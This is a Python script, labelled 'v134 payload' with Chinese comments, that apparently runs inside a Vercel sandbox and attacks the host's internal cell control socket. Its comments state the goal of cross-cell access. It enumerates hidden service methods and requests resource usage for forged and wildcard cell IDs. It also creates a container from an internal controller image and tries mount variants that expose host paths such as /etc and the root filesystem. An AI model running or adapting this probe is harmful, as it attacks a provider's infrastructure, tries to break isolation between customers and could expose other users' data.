# -*- coding: utf-8 -*-
"""v134 payload: cell API 方法枚举（services x methods）+ GetResourceUsage 参数变体 + Mount 参数变体
目标: 找 List/Get 等隐藏方法 -> 跨 cell 访问
输出 /vercel/sandbox/v134c.out"""
import socket, struct, time, json, os, signal

OUT = '/vercel/sandbox/v134c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(240)

CELL = '/run/cell/cell.sock'


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def connect_unix(sockpath, path, body, t=3.0, ctype='application/json'):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, ctype, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        status = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        return status, d[hdr_end + 4:hdr_end + 4 + 300] if hdr_end > 0 else b''
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


# 1: 方法枚举
log('=== 1 method enum ===')
SERVICES = [
    ('CTRS', '/vercel.hive.cell.api.containers.v1.ContainersService'),
    ('PROC', '/vercel.hive.cell.api.processes.v1.ProcessService'),
    ('USAGE', '/vercel.hive.cell.api.usage.v1.UsageService'),
    ('CELLS', '/vercel.hive.cell.api.cells.v1.CellsService'),
    ('IMGS', '/vercel.hive.cell.api.images.v1.ImagesService'),
    ('VOLS', '/vercel.hive.cell.api.volumes.v1.VolumesService'),
    ('NETS', '/vercel.hive.cell.api.networks.v1.NetworksService'),
    ('SNAPS', '/vercel.hive.cell.api.snapshots.v1.SnapshotsService'),
    ('CELL', '/vercel.hive.cell.api.cell.v1.CellService'),
    ('HOST', '/vercel.hive.cell.api.host.v1.HostService'),
    ('RUNT', '/vercel.hive.cell.api.runtime.v1.RuntimeService'),
    ('CTRL', '/vercel.hive.cell.api.controlplane.v1.ControlPlaneService'),
    ('META', '/vercel.hive.cell.api.meta.v1.MetaService'),
]
METHODS = ['List', 'Get', 'Inspect', 'Info', 'Describe', 'Status', 'GetStatus', 'GetInfo',
           'ListCells', 'GetCell', 'Query', 'Search', 'Count', 'Exists', 'Health', 'Ping',
           'Version', 'GetVersion', 'ListContainers', 'GetContainer', 'ListProcesses',
           'GetProcess', 'ListImages', 'GetImage', 'ListVolumes', 'GetVolume']
hits = []
for sname, spath in SERVICES:
    for m in METHODS:
        st, pay = connect_unix(CELL, '%s/%s' % (spath, m), b'{}', t=2.0)
        # 只记录非 404/非 NO_RESP 的
        if '404' not in st and 'NO_RESP' not in st:
            hits.append((sname, m, st, pay[:200]))
            log('HIT %s/%s -> %s %r' % (sname, m, st, pay[:200]))
log('enum done, %d hits' % len(hits))
for h in hits:
    log('HIT %s/%s %s %r' % h)

# 2: GetResourceUsage 参数变体
log('=== 2 usage variants ===')
cellid = 'hvc_iad1_b01540a2_2f6cff1c0b1747648fa89524545f1fb3'
variants = [
    ('empty', {}),
    ('cellId-own', {'cellId': cellid}),
    ('cellId-empty', {'cellId': ''}),
    ('cell-fake', {'cell': 'hvc_iad1_00000000_00000000000000000000000000000000'}),
    ('cellId-fake', {'cellId': 'hvc_iad1_00000000_00000000000000000000000000000000'}),
    ('all', {'cellId': '*'}),
    ('nonsense', {'foo': 'bar'}),
]
for name, body in variants:
    st, pay = connect_unix(CELL, '/vercel.hive.cell.api.usage.v1.UsageService/GetResourceUsage',
                           json.dumps(body).encode(), t=4)
    log('Usage[%s] -> %s %r' % (name, st, pay[:300]))

# 3: Mount 参数变体
log('=== 3 mount variants ===')
st, pay = connect_unix(CELL, '/vercel.hive.cell.api.containers.v1.ContainersService/Create',
                       json.dumps({'image': '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'}).encode(), t=10)
cid = None
try:
    cid = json.loads(pay.decode()).get('containerId')
except Exception:
    pass
log('Create -> %s cid=%s' % (st, cid))
if cid:
    for name, body in [
        ('plain', {'containerId': cid}),
        ('src-tgt', {'containerId': cid, 'source': '/tmp', 'target': '/mnt/x'}),
        ('src', {'containerId': cid, 'source': '/tmp'}),
        ('tgt', {'containerId': cid, 'target': '/mnt/x'}),
        ('path', {'containerId': cid, 'path': '/tmp'}),
        ('hostPath', {'containerId': cid, 'hostPath': '/etc', 'containerPath': '/mnt/e'}),
        ('volume', {'containerId': cid, 'volume': 'v133vol'}),
        ('srcpath', {'containerId': cid, 'srcPath': '/', 'dstPath': '/mnt/r'}),
        ('source-dest', {'containerId': cid, 'source': '/etc', 'destination': '/mnt/d'}),
        ('mount', {'containerId': cid, 'mount': {'source': '/etc', 'target': '/mnt/m'}}),
    ]:
        st, pay = connect_unix(CELL, '/vercel.hive.cell.api.containers.v1.ContainersService/Mount',
                               json.dumps(body).encode(), t=4)
        log('Mount[%s] -> %s %r' % (name, st, pay[:300]))
    st, pay = connect_unix(CELL, '/vercel.hive.cell.api.containers.v1.ContainersService/Kill',
                           json.dumps({'containerId': cid}).encode(), t=3)
    log('Kill -> %s %r' % (st, pay[:200]))

# 4: gRPC reflection
log('=== 4 reflection ===')
for rpath in ['/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo',
              '/grpc.reflection.v1.ServerReflection/ServerReflectionInfo']:
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(6)
        s.connect(CELL)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/grpc\r\n'
               'TE: trailers\r\n\r\n' % rpath).encode()
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        log('Reflect %s -> %r' % (rpath, d[:400]))
    except Exception as e:
        log('Reflect %s EXC %s' % (rpath, e))

log('V134_DONE')
f.close()
